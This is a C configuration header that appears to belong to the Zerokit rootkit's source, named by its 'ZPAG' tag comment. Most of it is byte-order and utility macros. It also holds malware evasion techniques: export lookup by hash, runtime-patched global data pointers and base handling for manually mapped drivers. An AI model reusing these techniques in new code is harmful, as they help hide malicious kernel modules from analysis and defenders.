#ifndef __MODSHARED_CONFIG_H_
#define __MODSHARED_CONFIG_H_

#include "version.h"

#ifndef NULL
#define NULL (void*)0
#endif // NULL


#ifndef LITTLE_ENDIAN
	#define LITTLE_ENDIAN 1234
#endif

#ifndef BIG_ENDIAN
	#define BIG_ENDIAN 4321
#endif

#define BYTE_ORDER LITTLE_ENDIAN


#if BYTE_ORDER == BIG_ENDIAN
	#define PP_HTONS(x) (x)
	#define PP_NTOHS(x) (x)
	#define PP_HTONL(x) (x)
	#define PP_NTOHL(x) (x)

	// Endianess-optimized shifting of two uint8_t to create one uint16_t
	#define LWIP_MAKE_U16(a, b) ((b << 8) | a)
#else
	#define PP_HTONS(x) ((((x) & 0xff) << 8) | (((x) & 0xff00) >> 8))
	#define PP_NTOHS(x) PP_HTONS(x)
	#define PP_HTONL(x) ((((x) & 0xff) << 24) | \
						 (((x) & 0xff00) << 8) | \
						 (((x) & 0xff0000UL) >> 8) | \
						 (((x) & 0xff000000UL) >> 24))
	#define PP_NTOHL(x) PP_HTONL(x)

	// Endianess-optimized shifting of two uint8_t to create one uint16_t
	#define LWIP_MAKE_U16(a, b) ((a << 8) | b)
#endif // BYTE_ORDER == BIG_ENDIAN

#define HTONS(x) pGlobalBlock->pCommonBlock->fnhtons(x)
#define NTOHS(x) pGlobalBlock->pCommonBlock->fnhtons(x)
#define HTONL(x) pGlobalBlock->pCommonBlock->fnhtonl(x)
#define NTOHL(x) pGlobalBlock->pCommonBlock->fnhtonl(x)

#define _ALIGN(size, align) (((size) + ((align) - 1)) & ~((align) - 1))

#define LWIP_MAX(x , y)  (((x) > (y)) ? (x) : (y))
#define LWIP_MIN(x , y)  (((x) < (y)) ? (x) : (y))

#ifndef NULL
	#define NULL ((void *)0)
#endif

/** Get the absolute difference between 2 uint32_t values (correcting overflows)
 * 'a' is expected to be 'higher' (without overflow) than 'b'. */
#define LWIP_U32_DIFF(a, b) (((a) >= (b)) ? ((a) - (b)) : (((a) + ((b) ^ 0xFFFFFFFF) + 1))) 

#ifdef _WIN64
	#define GLOBAL_DATA_PATTERN 0xBBBBBBBBBBBBBBBB

	#define USE_GLOBAL_BLOCK pglobal_block_t pGlobalBlock; \
		pGlobalBlock = getGlobalDataPtr();

	#define DECLARE_GLOBAL_FUNC(structName, funcName) structName->fn##funcName = (Fn##funcName)((uint8_t*)funcName)
#else
	#define GLOBAL_DATA_PATTERN 0xBBBBBBBB

	#define USE_GLOBAL_BLOCK pglobal_block_t pGlobalBlock; \
		__asm mov eax, 0xBBBBBBBB __asm mov [pGlobalBlock], eax

	#define DECLARE_GLOBAL_FUNC(structName, funcName) structName->fn##funcName = (Fn##funcName)((uint8_t*)funcName + MOD_BASE)
#endif

#include "../../shared/types.h"

#ifdef _WIN64
extern void* getGlobalDataPtr();
#endif // _WIN64

#define DECLARE_SYSTEM_FUNC(structName, funcName, moduleBase) structName->fn##funcName = fnpe_find_export_by_hash(moduleBase, funcName##_Hash, fncommon_calc_hash)

#if DBG 
	#define _NON_STD_DRIVER 0
#else
	#define _NON_STD_DRIVER 1
#endif // DBG

#if _NON_STD_DRIVER
	#ifdef _WIN64
		#define MOD_BASE 0
	#else
		#define MOD_BASE modBase - *(uint32_t*)modBase
	#endif
#else
	#define MOD_BASE 0
#endif

#define LOADER_TAG 'ZPAG' // Zerokit is Powerful As a God
#define ALLOCATOR_TAG 'ZPAG'
#define LOADER_ID_SIZE 64

#ifndef MAX_PATH
	#define MAX_PATH 260
#endif // !MAX_PATH

#if DBG
	#define FnKdPrint(_x_) pGlobalBlock->pCommonBlock->fnDbgPrint _x_
#else
	#define FnKdPrint(_x_)
#endif // DBG


#define MOD_COMMON_ERR_BASE		-99
#define MOD_CONFIG_ERR_BASE		-199
#define MOD_CRYPTO_ERR_BASE		-299
#define MOD_DISSASM_ERR_BASE	-399
#define MOD_DISKIO_ERR_BASE		-499
#define MOD_TASKS_ERR_BASE		-599
#define MOD_LAUNCHER_ERR_BASE	-699
#define MOD_NETWORK_ERR_BASE	-799
#define MOD_TCPIP_ERR_BASE		-899
#define MOD_NETCOMMON_ERR_BASE	-999
#define MOD_LOGIC_ERR_BASE		-1099


typedef pvoid_t (*FnGetDataFromCode)();


typedef size_t (*FARPROC)(void);
#endif // __MODSHARED_CONFIG_H_
